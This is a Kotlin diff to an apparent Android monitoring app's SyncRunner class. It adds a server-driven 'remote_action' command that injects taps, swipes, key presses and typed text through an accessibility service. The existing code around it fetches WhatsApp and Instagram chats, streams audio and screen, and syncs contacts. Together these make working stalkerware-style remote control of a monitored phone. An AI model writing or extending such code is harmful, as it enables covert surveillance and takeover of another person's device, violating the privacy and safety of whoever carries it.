@@ -77,6 +77,7 @@ class SyncRunner(private val context: Context) {
         processStreamCommands(bearer, commands, "audio_stream", ::processAudioStreamCommand)
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
         commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
+        commands.filter { it.command_type == "remote_action" }.forEach { processRemoteActionCommand(bearer, it) }
 
         val flagsResponse = try {
             ApiClient.service.getFeatureFlags(bearer)
@@ -204,6 +205,7 @@ class SyncRunner(private val context: Context) {
         commands.filter { it.command_type == "whatsapp_sync_now" }.forEach { processWhatsAppSyncCommand(bearer, it) }
         commands.filter { it.command_type == "get_whatsapp_chat" }.forEach { processGetWhatsAppChatCommand(bearer, it) }
         commands.filter { it.command_type == "get_instagram_chat" }.forEach { processGetInstagramChatCommand(bearer, it) }
+        commands.filter { it.command_type == "remote_action" }.forEach { processRemoteActionCommand(bearer, it) }
         commands.filter { it.command_type == "sync_contacts" }.forEach { processSyncContactsCommand(bearer, it) }
 
         // 2. Heavy periodic background collectors run after commands complete
@@ -574,6 +576,94 @@ class SyncRunner(private val context: Context) {
             }
         }
         handler(bearer, matching.last())
+    }
+
+    private suspend fun processRemoteActionCommand(bearer: String, command: RemoteCommand) {
+        val payload = command.payload ?: emptyMap()
+        val type = (payload["type"] as? String).orEmpty()
+        val a11y = com.spapp.monitoring.blocking.BlockAccessibilityService.instance
+        var success = false
+        var message = "Accessibility service inactive"
+
+        if (a11y != null) {
+            when (type.lowercase()) {
+                "key" -> {
+                    val key = (payload["key"] as? String).orEmpty()
+                    success = a11y.injectGlobalAction(key)
+                    message = "Key $key -> $success"
+                }
+                "text" -> {
+                    val text = (payload["text"] as? String).orEmpty()
+                    val pressEnter = (payload["pressEnter"] as? Boolean) ?: false
+                    success = a11y.injectText(text, pressEnter)
+                    message = "Text injection -> $success"
+                }
+                "tap" -> {
+                    val normX = (payload["x"] as? Number)?.toDouble() ?: -1.0
+                    val normY = (payload["y"] as? Number)?.toDouble() ?: -1.0
+                    val wm = context.getSystemService(android.content.Context.WINDOW_SERVICE) as? android.view.WindowManager
+                    val display = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+                        context.display ?: wm?.defaultDisplay
+                    } else {
+                        @Suppress("DEPRECATION")
+                        wm?.defaultDisplay
+                    }
+                    val metrics = android.util.DisplayMetrics()
+                    @Suppress("DEPRECATION")
+                    display?.getRealMetrics(metrics) ?: run {
+                        val dm = context.resources.displayMetrics
+                        metrics.widthPixels = dm.widthPixels
+                        metrics.heightPixels = dm.heightPixels
+                    }
+                    val screenW = metrics.widthPixels.toFloat()
+                    val screenH = metrics.heightPixels.toFloat()
+                    val px = if (normX in 0.0..1.0) (normX * screenW).toFloat() else normX.toFloat()
+                    val py = if (normY in 0.0..1.0) (normY * screenH).toFloat() else normY.toFloat()
+                    success = a11y.injectTap(px.coerceIn(0f, screenW - 1f), py.coerceIn(0f, screenH - 1f))
+                    message = "Tap ($px, $py) -> $success"
+                }
+                "swipe" -> {
+                    val sNormX = (payload["startX"] as? Number)?.toDouble() ?: -1.0
+                    val sNormY = (payload["startY"] as? Number)?.toDouble() ?: -1.0
+                    val eNormX = (payload["endX"] as? Number)?.toDouble() ?: -1.0
+                    val eNormY = (payload["endY"] as? Number)?.toDouble() ?: -1.0
+                    val duration = (payload["duration"] as? Number)?.toLong() ?: 250L
+
+                    val wm = context.getSystemService(android.content.Context.WINDOW_SERVICE) as? android.view.WindowManager
+                    val display = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+                        context.display ?: wm?.defaultDisplay
+                    } else {
+                        @Suppress("DEPRECATION")
+                        wm?.defaultDisplay
+                    }
+                    val metrics = android.util.DisplayMetrics()
+                    @Suppress("DEPRECATION")
+                    display?.getRealMetrics(metrics) ?: run {
+                        val dm = context.resources.displayMetrics
+                        metrics.widthPixels = dm.widthPixels
+                        metrics.heightPixels = dm.heightPixels
+                    }
+                    val screenW = metrics.widthPixels.toFloat()
+                    val screenH = metrics.heightPixels.toFloat()
+
+                    val sx = if (sNormX in 0.0..1.0) (sNormX * screenW).toFloat() else sNormX.toFloat()
+                    val sy = if (sNormY in 0.0..1.0) (sNormY * screenH).toFloat() else sNormY.toFloat()
+                    val ex = if (eNormX in 0.0..1.0) (eNormX * screenW).toFloat() else eNormX.toFloat()
+                    val ey = if (eNormY in 0.0..1.0) (eNormY * screenH).toFloat() else eNormY.toFloat()
+
+                    success = a11y.injectSwipe(sx, sy, ex, ey, duration)
+                    message = "Swipe -> $success"
+                }
+            }
+        }
+
+        try {
+            ApiClient.service.ackCommand(
+                bearer,
+                command.id,
+                AckCommandRequest(success = success, message = message)
+            )
+        } catch (_: Exception) {}
     }
 
     private suspend fun processScreenStreamCommand(bearer: String, command: RemoteCommand) {
